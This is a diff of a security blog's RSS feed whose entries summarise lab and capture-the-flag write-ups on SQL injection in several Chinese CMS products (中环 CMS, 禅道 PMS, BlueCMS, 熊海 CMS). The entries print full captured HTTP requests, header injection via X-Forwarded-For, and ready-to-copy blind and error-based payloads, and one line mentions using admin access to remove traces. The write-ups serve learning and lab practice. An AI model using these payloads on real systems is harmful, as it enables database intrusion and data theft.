@@ -7,21 +7,35 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>null</copyright>
-    <lastBuildDate>Thu, 15 Feb 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 19 Feb 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://xxxhidexxx.github.io/categories/sec/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>BlueCMS v1.6 存在 XFF 伪造漏洞</title>
+      <title>中环 CMS 主页面存在 SQL 注入</title>
+      <link>https://xxxhidexxx.github.io/posts/sec/sqli7/</link>
+      <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
+      <guid>https://xxxhidexxx.github.io/posts/sec/sqli7/</guid>
+      <description>注入点 第一次见到这种注入点。我们在搜索框输入 t 然后抓包，这是为了保证返回的搜索内容不为空。&#xA;发现 sertype 变量在加入恒真恒伪后提供了一个布尔盲注点位。&#xA;POST /index.php/index/search HTTP/1.1&#xD;Host: 111.9.41.91:53009&#xD;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0&#xD;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#xD;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#xD;Accept-Encoding: gzip, deflate, br&#xD;Content-Type: application/x-www-form-urlencoded&#xD;Content-Length: 140&#xD;Origin: http://111.9.41.91:53009&#xD;Connection: close&#xD;Referer: http://111.9.41.91:53009/index.php/index/search&#xD;Cookie: admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; PHPSESSID=0gficahl2rfqurrer05uhkdv96&#xD;Upgrade-Insecure-Requests: 1&#xD;sertype=1 and 1=2;#&amp;amp;search=t&amp;amp;sub=%E6%90%9C%E7%B4%A2&#xD;爆破 开 burp 爆破。&#xA;构造如下 payload。&#xA;1 and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=100;# 1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;flag_db&#39; limit 0,1),1,1))=1;# 1 and ascii(substr((select column_name from information_schema.</description>
+    </item>
+    <item>
+      <title>禅道 PMS 用户登录存在 SQL 注入</title>
+      <link>https://xxxhidexxx.github.io/posts/sec/sqli6/</link>
+      <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
+      <guid>https://xxxhidexxx.github.io/posts/sec/sqli6/</guid>
+      <description>语法报错 下述 payload 可以直接复制使用。&#xA;extractvalue() 1&#39; and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and &#39;1&#39;=&#39;1&#xD;updatexml() 1&#39; and updatexml(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) and &#39;1&#39;=&#39;1&#xD;floor() 1&#39; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.tables group by x)a) and &#39;1&#39;=&#39;1&#xD;攻击流程 打开靶场看到如下页面。在输入随机用户名密码之后会出现弹窗，告诉我们密码有误。但是输入单引号之后，页面没有任何变化。没有出现弹窗说明单引号起作用了，这提示我们存在 sql 注入点。我们用 burp 抓包发现虽然浏览器里面的页面没有显示报错，但是 burp 里面可以看到语法报错。后面走走流程就可以拿到 flag。&#xA;构造如下 payload。&#xA;1&#39; and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and &#39;1&#39;=&#39;1&#xD;1&#39; and extractvalue(1,concat(0x5c,0x7e,(select table_name from information_schema.</description>
+    </item>
+    <item>
+      <title>Blue CMS v1.6 留言区存在 XFF 伪造漏洞</title>
       <link>https://xxxhidexxx.github.io/posts/sec/sqli5/</link>
       <pubDate>Thu, 15 Feb 2024 00:00:00 +0000</pubDate>
       <guid>https://xxxhidexxx.github.io/posts/sec/sqli5/</guid>
       <description>概述 这是个靶场，提示 header 注入。打开网页的留言区发现了留言显示 ip 地址，因此想到伪造 X-FORWARDED-FOR。最终我们在留言区将留言作为回显拿到了 flag。&#xA;找到注入点 打开靶场后看到如下界面。&#xA;发现可以用弱口令登录管理员后台。&#xA;如果是真实场景我们可以考虑尝试在后台挖别的漏洞，但是考虑到靶场提示 flag 用到 http-header 做 sql 注入，我们考虑先回原来的网站尝试寻找能显示 ip 的地方。&#xA;（事后发现登录管理员权限也是有意义的，主要是在拿到 flag 之后删除痕迹，逃离肇事现场。）&#xA;回到原来的页面，找到留言区，发现提交留言会显示 ip 地址。我们用 burp 抓包后在请求里面人为添加一行 xff 进行伪造。&#xA;POST /guest_book.php HTTP/1.1&#xD;Host: 111.9.41.91:53005&#xD;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0&#xD;X-FORWARDED-FOR: &#39;&#xD;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#xD;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#xD;Accept-Encoding: gzip, deflate, br&#xD;Content-Type: application/x-www-form-urlencoded&#xD;Content-Length: 36&#xD;Origin: http://111.9.41.91:53005&#xD;Connection: close&#xD;Referer: http://111.9.41.91:53005/guest_book.php&#xD;Cookie: __tins__713776=%7B%22sid%22%3A%201708012726639%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201708014526639%7D; __51cke__=; __51laig__=1; PHPSESSID=eigkieftqj4bb7qg3frjdtav35; admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; detail=1&#xD;Upgrade-Insecure-Requests: 1&#xD;content=test&amp;amp;act=send&amp;amp;rid=&amp;amp;page_id=1&#xD;我们在 xff 处分别写单引号和 0.</description>
     </item>
     <item>
-      <title>熊海 CMS 后台登录的 SQL 注入</title>
+      <title>熊海 CMS v1.0 后台登录存在 SQL 注入</title>
       <link>https://xxxhidexxx.github.io/posts/sec/sqli4/</link>
       <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
       <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
-      <description>这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。&#xA;有必要说的是，这个登录页面是个弱口令，但是急于用弱口令登录进去就会错过外面这个登录页面的漏洞。&#xA;最终我们发现这个登录页面存在 sql 注入，可以在不登录的情况下借助外带的语法报错拿到数据库信息。&#xA;语法回顾 我们使用 extractvalue() 和 concat() 这两个函数引起报错。&#xA;extractvalue(xml_frag,xpath_expr) 是 mysql 的 xml 函数，有两个字符串参数，我们写 extractvalue(1,concat(&amp;hellip;)) 就可以了。concat() 就是拼接字符串，我们写一个 0x5c 或者 0x7e 就会引起路径错误，payload 如下。&#xA;1&#39; and extractvalue(1,concat(&#xD;0x5c,&#xD;0x7e,&#xD;(select value from flag_db.flag limit 0,1),&#xD;0x7e&#xD;)) and &#39;1&#39;=&#39;1&#xD;同样是 xml 函数的 updatexml() 可以替代 extractvalue()，payload 如下。&#xA;1&#39; and updatexml(1,concat(&#xD;0x5c,&#xD;0x7e,&#xD;(select value from flag_db.flag limit 0,1)，&#xD;0x7e&#xD;),1) and &#39;1&#39;=&#39;1&#xD;在这两个 xml 函数用不了的时候用 floor() 报错也可以，但是写起来会比较麻烦，payload 如下。</description>
+      <description>这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。&#xA;有必要说的是，这个登录页面是个弱口令，但是急于用弱口令登录进去就会错过外面这个登录页面的漏洞。&#xA;最终我们发现这个登录页面存在 sql 注入，可以在不登录的情况下借助外带的语法报错拿到数据库信息。&#xA;语法回顾 我们使用 extractvalue() 和 concat() 这两个函数引起报错。&#xA;extractvalue(xml_frag,xpath_expr) 是 mysql 的 xml 函数，有两个字符串参数，我们写 extractvalue(1,concat(&amp;hellip;)) 就可以了。concat() 就是拼接字符串，我们写一个 0x5c 或者 0x7e 就会引起路径错误，payload 如下。&#xA;1&#39; and extractvalue(1,concat(&#xD;0x5c,&#xD;0x7e,&#xD;(select value from flag_db.flag limit 0,1),&#xD;0x7e&#xD;)) and &#39;1&#39;=&#39;1&#xD;同样是 xml 函数的 updatexml() 可以替代 extractvalue()，payload 如下。&#xA;1&#39; and updatexml(1,concat(&#xD;0x5c,&#xD;0x7e,&#xD;(select value from flag_db.flag limit 0,1),&#xD;0x7e&#xD;),1) and &#39;1&#39;=&#39;1&#xD;在这两个 xml 函数用不了的时候用 floor() 报错也可以，但是写起来会比较麻烦，payload 如下。</description>
     </item>
     <item>
       <title>Kali Linux 网络设置</title>
@@ -29,13 +43,6 @@
       <pubDate>Sat, 10 Feb 2024 00:00:00 +0000</pubDate>
       <guid>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</guid>
       <description>连不上网的时候可以用如下指令。&#xA;dhclient -v&#xD;代理走本机的话可以用本机开 clash。&#xA;创建脚本。&#xA;#!/bin/bash&#xD;# encoding: utf-8&#xD;Proxy_IP=192.168.1.1&#xD;Proxy_Port=8080&#xD;# Set System Proxy&#xD;function xyon(){&#xD;export https_proxy=http://$Proxy_IP:$Proxy_Port&#xD;export http_proxy=http://$Proxy_IP:$Proxy_Port&#xD;export all_proxy=socks5://$Proxy_IP:$Proxy_Port&#xD;echo -e &amp;quot;System Proxy is $Proxy_IP:$Proxy_Port&amp;quot;&#xD;}&#xD;# unSet System Proxy&#xD;function xyoff(){&#xD;unset all_proxy&#xD;unset https_proxy&#xD;unset http_proxy&#xD;echo -e &amp;quot;System Proxy is Disabled&amp;quot;&#xD;}&#xD;# Default Function is Set Proxy&#xD;if [ $# != 0 ]&#xD;then&#xD;if [ $1 == &#39;off&#39; ]&#xD;then&#xD;xyoff&#xD;elif [ $1 == &#39;on&#39; ]&#xD;then&#xD;xyon&#xD;else&#xD;echo &amp;quot;Please Input on or off!</description>
-    </item>
-    <item>
-      <title>用 Burp Suite 跑 MySQL 盲注</title>
-      <link>https://xxxhidexxx.github.io/posts/sec/sqli3/</link>
-      <pubDate>Wed, 07 Feb 2024 00:00:00 +0000</pubDate>
-      <guid>https://xxxhidexxx.github.io/posts/sec/sqli3/</guid>
-      <description>提要 盲注就是存在注入点但是看不到回显点。这通常有两种情况，或者是输入 ?id=1&#39; and 1=2 --+ 能看到报错页面，或者是输入 ?id=1&#39; and sleep(3) --+ 回车能看到网页延迟刷新。这里 sleep(3) 延迟的不一定是三秒也可能是 3 的倍数，因为 sleep 可能被执行了不止一次。数据库一般都有延时函数，例如 mysql 的 sleep()，这种注入方法一般称为时间盲注。在页面没有任何明确显示的情况下，把响应时间作为一种显示，这个想法很有趣，然而，在现实场景中时间盲注成本比较高，运算量可能比较大，不是很稳定，除非一定要爆破，应该谨慎考虑这个选择。&#xA;我们这里主要演示的是用 burp 脚本进行爆破。如果手工注入的话语句的 = 改成 &amp;gt; 然后使用二分法就可以了，也没什么好讲的。&#xA;在做这个靶场的时候我们发现 burp 跑出来的时间盲注结果和自己手工测试的不一样。相同的测试语句，手工的结果是正确的，但是 burp 的响应时间比较抽象，还不知道原因。&#xA;用 burp 跑有报错的布尔盲注倒是很顺利，如下所述。&#xA;演示 还是用之前的靶场进行测试。首先用 &#39; and 1=2 --+ 找到注入点。看到页面报错。&#xA;打开 burp 抓包后发送到 intruder，选择集束炸弹。选中要遍历的参数之后点击添加 payload。我们两个的 payload 点位分别是 ascii 和字符串位数，所以类型都选择数值，ascii 我们直接从 1 跑到 128。&#xA;点击 attack 按钮之后可以看到响应包的长度有不同，比较长的就说明是正常显示的。我们把不报错的 ascii 码依次解码得到数据库名 webug。&#xA;然后可以进一步爆破表名和字段名找到 flag。语句的写法例如&#xA;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&amp;gt;1 --+&#xD;讲一下 sql 语法。这里的 substr 的用法是 substr(object,start,length) 所以 start 遍历 1~n，然后 length 永远写 1。这里 limit 0,1 的意思是从第 0 项开始查询 1 项，所以是第一个参数遍历 0~n，第二个参数恒为 1。</description>
     </item>
     <item>
       <title>Oracle 联合注入</title>
